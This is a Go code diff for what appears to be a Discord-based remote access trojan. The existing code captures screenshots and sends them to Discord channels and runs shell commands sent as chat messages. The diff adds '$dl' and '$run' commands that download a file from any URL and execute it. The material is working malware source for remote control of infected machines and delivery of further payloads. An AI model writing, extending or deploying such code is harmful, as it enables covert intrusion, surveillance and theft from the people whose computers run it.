@@ -3,11 +3,12 @@ package main
 import(
 	"fmt"
 	"time"
-	"flag"
+	//"flag"
 	"strings"
 	"strconv"
 	"os"
 	"os/user"
+	"os/exec"
 	"io"
 	"net/http"
 	"image/png"
@@ -21,9 +22,9 @@ import(
 var(
 	first int = 0
 	kill int = 0
+	id string = ""
+	
 	username string
-	id string
-
 	channel_id []string
 )
 
@@ -36,6 +37,16 @@ func rand_str(num int) (string) {
 		bytes[q] = abc[rand.Intn(len(abc))]
 	}
 	return string(bytes)
+}
+
+func dl_file(url string, path string) {
+	dl_http, _ := http.Get(url)
+	defer dl_http.Body.Close()
+
+	file, _ := os.Create(path)
+	io.Copy(file, dl_http.Body)
+	
+	file.Close()
 }
 
 func html_parse(body string) ([]string) {
@@ -141,23 +152,33 @@ func msg_callback(s *discordgo.Session, m *discordgo.MessageCreate) {
 		send_ss(s, ss_files, channel_id[0])
 		send_ss(s, ss_files, channel_id[1])
 	} else if strings.Contains(m.Content, "$shell " + username) {
-		command_splice := strings.Split(m.Content, username + " ")
-		fmt.Println(command_splice[1:])
-		command := strings.Join(command_splice[1:], "")
-		fmt.Println(command)
-	
-		cmd_test := cmd.NewCmd(command)
+		command_splice := strings.Split(m.Content, " ")
+		command := strings.Join(command_splice[2:3], "")
+		cmd_test := cmd.NewCmd(command, command_splice[3:]...)
 		cmd_status := <-cmd_test.Start()
 		for _, v := range cmd_status.Stdout {
 			send_msg(s, v)
 		}
+	} else if m.Content == "$type " + username {
+		
+	} else if strings.Contains(m.Content, "$dl " + username) {
+		dl_info := strings.Split(m.Content, " ")
+		dl_url := strings.Join(dl_info[2:3], "")
+		dl_path := strings.Join(dl_info[3:], "")
+		dl_file(dl_url, dl_path)
+	} else if strings.Contains(m.Content, "$run " + username) {
+		run_msg := strings.Split(m.Content, "$run " + username + " ")
+		file_to_run, _ := exec.LookPath(strings.Join(run_msg[1:], ""))
+		fmt.Printf("%v", file_to_run)
+		run_cmd := exec.Cmd{Path: file_to_run,}
+		run_cmd.Run()
 	}
 }
 /* callbacks */
 
 func main() {
-	flag.StringVar(&id, "id", "", "Author ID")
-	flag.Parse()
+	//flag.StringVar(&id, "id", "", "Author ID")
+	//flag.Parse()
 
 	rand.Seed(time.Now().UnixNano())
 
